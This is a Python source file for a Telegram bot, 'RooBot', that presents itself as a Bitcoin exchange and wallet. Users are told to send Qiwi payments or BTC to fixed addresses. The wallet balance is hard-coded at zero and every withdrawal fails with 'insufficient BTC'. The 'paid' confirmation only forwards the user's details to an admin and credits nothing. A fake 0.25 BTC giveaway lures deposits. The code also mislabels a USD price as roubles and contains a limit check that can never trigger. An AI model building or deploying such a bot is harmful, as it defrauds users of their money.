import time
from datetime import datetime
import random
import requests
from bs4 import BeautifulSoup
from config import *
from telebot import types
from sqlite3 import connect


def isfloat(value):
    try:
        float(value)
        return True
    except ValueError:
        return False


def btc():
    url = 'https://coinmarketcap.com/currencies/bitcoin/'
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    price_element = soup.find('div', {'class': 'priceValue'})
    price = float(price_element.text.strip().replace(',', '').replace('$', ''))
    return price


@bot.message_handler(commands=["start"])
def start(message):
    conn = connect("data.sqlite")  # connect to database
    cursor = conn.execute("SELECT * FROM users WHERE Id = ?", [message.from_user.id])
    if not cursor.fetchall():
        conn.execute("INSERT INTO users VALUES (?, ?, ?, ?, ?)",
                     [message.from_user.id, message.from_user.first_name, message.from_user.last_name, message.from_user.username, 0])
        conn.commit()
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
    bot.send_message(message.chat.id, '✌️ Приветствуем Вас, ' + '<b>' + message.chat.first_name + '</b>' + '!\n\n'
                                      '<b>RooBot</b> - это моментальный обмен <b>Bitcoin на Qiwi, Сбербанк, '
                                      'Яндекс.Деньги и Webmoney</b>\n\n'
                                      '❕ А так же бесплатное хранилище Ваших <b>BTC</b>\n\n', reply_markup=keyboard, parse_mode="Html")


def summa(message):
    if message.text.isdigit():
        if max_summa < int(message.text) < min_summa:
            sent = bot.send_message(message.chat.id, f'❌ Сумма в рублях <b>не должна быть меньше</b> {min_summa} рублей и <b>не должна быть больше</b> {max_summa} рублей', parse_mode="Html")
            bot.register_next_step_handler(sent, summa)
        else:
            money = float(message.text)/btc()
            money = float("%.6f" % money)
            bot.send_message(message.chat.id, '✅ ' + str(message.text) + ' RUB' + ' = ' + str(money) + ' BTC\n\n'
                                              'Чтобы получить ' + '<b>' + str(money) + ' BTC</b>' + ' Вам необходимо совершить QIWI перевод на сумму ' + '<b>' + str(message.text) + ' rub</b> '
                                              'на никнейм, который указан ниже\n\n'
                                              '<b>❗️ Комментарий обязательно</b>', parse_mode="Html")
            time.sleep(1)
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            keyboard.add(*[types.KeyboardButton(name) for name in ['✅ Оплатил', '❌ Отказаться']])
            bot.send_message(message.chat.id, qiwi_address + '\n''<b>Комментарий:</b> ' + str(random.randrange(1, 99999)) + '\n\n', reply_markup=keyboard, parse_mode="Html")
        return
    if isfloat(message.text):
        if max_summa < (float(message.text)*btc()) < min_summa:
            min_money = min_summa/btc()
            min_money = float("%.6f" % min_money)
            max_money = max_summa / btc()
            max_money = float("%.6f" % max_money)
            sent = bot.send_message(message.chat.id, '❌ Сумма в BTC <b>не должна быть меньше</b> ' + str(min_money) + ' BTC и <b>не должна быть больше</b> ' + str(max_money) + ' BTC', parse_mode="Html")
            bot.register_next_step_handler(sent, summa)
        else:
            money = float(message.text)*btc()
            bot.send_message(message.chat.id, '✅ ' + str(message.text) + ' BTC' + ' = ' + str(round(money)) + ' RUB\n\n'
                                              'Чтобы получить ' + '<b>' + str(message.text) + ' BTC</b>' + ' Вам необходимо совершить QIWI перевод на сумму ' + '<b>' + str(round(money)) + ' rub</b> '
                                              'на никнейм, который указан ниже\n\n'
                                              '<b>❗️ Комментарий обязательно</b>', parse_mode="Html")
            time.sleep(1)
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            keyboard.add(*[types.KeyboardButton(name) for name in ['✅ Оплатил', '❌ Отказаться']])
            bot.send_message(message.chat.id, qiwi_address + '\n''<b>Комментарий:</b> ' + str(random.randrange(1, 99999)) + '\n\n', reply_markup=keyboard, parse_mode="Html")
        return
    else:
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
        bot.send_message(message.chat.id, '❌ <b>Некорректный ввод</b>\nВы возвращены на главную страницу', parse_mode="Html", reply_markup=keyboard)


def qiwi(chat_id):
    sent = bot.send_message(chat_id, '📥 <b>Qiwi</b>\n\nВведите сумму в <b>BTC</b> которую хотите получить или в <b>рублях</b> которые хотите перевести\n\nНапример: <b>0.002 или 750</b>\n\n'
                                     '<b>❗️ BTC вводить только через точку</b>\n\nКурс обмена:\n<code>1 BTC = ' + str(btc()) + ' RUB</code>', parse_mode="Html")
    bot.register_next_step_handler(sent, summa)


@bot.message_handler(content_types=["text"])
def key(message):
    if message.text == '💼 Кошелек':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📉 Вывести BTC', '📈 Внести BTC']])
        bot.send_message(message.chat.id, '<b>💼 Bitcoin-кошелек</b>\n\n'
                                          '<b>Баланс:</b> 0.00 BTC\n'
                                          '<b>Примерно:</b> 0 руб\n\n'
                                          '<b>Всего вывели:</b> 0.00 BTC (0 руб)\n'
                                          '<b>Всего пополнили:</b> 0.00 BTC (0 руб)\n', reply_markup=keyboard, parse_mode="Html")
    elif message.text == '📊 Обмен BTC':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить', '📉 Продать']])
        bot.send_message(message.chat.id, '📊 <b>Купить/Продать Bitcoin</b>\n\n'
                                          'Бот работает полностью в <b>автоматическом режиме</b>. Средства поступают моментально\n', reply_markup=keyboard, parse_mode="Html")
    elif message.text == '🚀 О сервисе':
        bot.send_message(message.chat.id, '🚀 <b>О сервисе</b>\n\n'
                                          'Сервис для обмена Bitcoin.\n'
                                          'Пополняй внутренний кошелек с помощью Qiwi или внешнего Bitcoin-кошелька\n\n'
                                          'Продавай эти BTC для вывода на Сбербанк, Яндекс.Деньги, Webmoney и Qiwi. Или выводи на свой внешний Bitcoin-адрес\n\n'
                                          f'У нас установлено ограничение минимального <b>({min_summa} рублей)</b> и максимального <b>({max_summa} рублей)</b> единовременного платежа\n\n', parse_mode="Html")
    elif message.text == '📌 Акция':
        bot.send_message(message.chat.id, '📌 <b>Акция</b>\n\n'
                                          '<b>❗️Мы разыгрываем 0.25 BTC❗️</b>\n\n'
                                          'Для участия в конкурсе необходимо лишь воспользоваться нашим сервисом в период с <b>02.01.2023 по 03.01.2023</b> и иметь остаток на балансе не менее <b>0.001 BTC</b>\n\n'
                                          'Этот остаток принадлежит Вам (не является платой за участие). После конкурса, даже в случае победы, никакая комиссия взиматься не будет\n\n'
                                          'Так же <b>ОБЯЗАТЕЛЬНО укажите свой @username</b>, если он у Вас еще не указан\n\n'
                                          'Определение победителя будет проходить в прямой трансляции на площадке <b>YouTube 1 марта 2023 года в 20:00 по Московскому времени</b>\n\n'
                                          '<b>Победитель получит 0.25 BTC на свой внутренний кошелек без каких либо комиссий!</b>\n\n'
                                          'За 3 часа до начала Вам придет оповещение с ссылкой на трансляцию\n\n', parse_mode="Html")
    elif message.text == '✅ Оплатил':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
        bot.send_message(message.chat.id, '✅ Отлично\n'
                                          'В ближайшее время Ваши BTC будут доступны для вывода', reply_markup=keyboard, parse_mode="Html")
        text = str(f'Username - {message.chat.username}  {datetime.now()} \n {message.chat.first_name}  {message.chat.last_name}  {message.chat.id}')
        bot.send_message(admin_id, text)
    elif message.text == '❌ Отказаться':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
        bot.send_message(message.chat.id, '⚠️ Вы можете приобрести BTC в любое другое время!\n', reply_markup=keyboard, parse_mode="Html")


@bot.callback_query_handler(func=lambda c: True)
def inline(x):
    if x.data == '📈 Купить':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📥 Qiwi', '📥 Bitcoin']])
        bot.send_message(x.message.chat.id, '📈 <b>Купить</b>\n\n'
                                            'Покупка BTC производится с помощью <b>Qiwi</b> или переводом на многоразовый <b>Bitcoin-адрес</b> с внешнего кошелька\n\n'
                                            'Выберите способ пополнения\n\n', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📉 Продать':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['Qiwi', 'Сбербанк', 'Webmoney', 'Яндекс.Деньги']])
        bot.send_message(x.message.chat.id, '📉 <b>Продать</b>\n\n'
                                            'Продажа BTC осуществляется путём списания с Вашего <b>внутреннего Bitcoin-кошелька</b> и последующей отправкой рублей на выбранную Вами площадку\n'
                                            'Куда Вы хотите вывести <b>BTC</b>?', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📉 Вывести BTC':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить']])
        bot.send_message(x.message.chat.id, '📉 <b>Вывести BTC</b>\n\n⚠️<b>У вас недостаточно BTC</b>\n'
                                            'Мин. сумма вывода: 0.0008 BTC', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📈 Внести BTC':
        bot.send_message(x.message.chat.id, '📈 <b>Внести BTC</b>\n\nЧтобы пополнить <b>Bitcoin-кошелек</b>, Вам надо перевести Ваши BTC на многоразовый адрес который будет указан ниже\n\n'
                                            'После перевода и подтверждения 1 транзакции, Ваши BTC будут отображаться у Вас в кошельке\n'
                                            'И вы их сможете вывести на любую другую платформу, или перевести на внешний Bitcoin-адрес', parse_mode="Html")
        time.sleep(1)
        bot.send_message(x.message.chat.id, '<b>' + str(btc_address) + '</b>', parse_mode="Html")
    elif x.data == 'Qiwi' or x.data == 'Сбербанк' or x.data == 'Яндекс.Деньги' or x.data == 'Webmoney':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить']])
        bot.send_message(x.message.chat.id, '⚠️ <b>У вас недостаточно BTC</b>\n'
                                            'Мин. сумма вывода: 0.0008 BTC', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📥 Qiwi':
        qiwi(x.message.chat.id)
    elif x.data == '📥 Bitcoin':
        bot.send_message(x.message.chat.id, '📥 <b>Bitcoin</b>\n\nЧтобы пополнить <b>Bitcoin-кошелек</b>, Вам надо перевести Ваши BTC на многоразовый адрес который будет указан ниже\n\n'
                                            'После перевода и подтверждения 1 транзакции, Ваши BTC будут отображаться у Вас в кошельке\n'
                                            'И вы их сможете вывести на любую другую платформу, или перевести на внешний Bitcoin-адрес', parse_mode="Html")
        time.sleep(0.3)
        bot.send_message(x.message.chat.id, '<b>' + str(btc_address) + '</b>', parse_mode="Html")


bot.polling(none_stop=True)
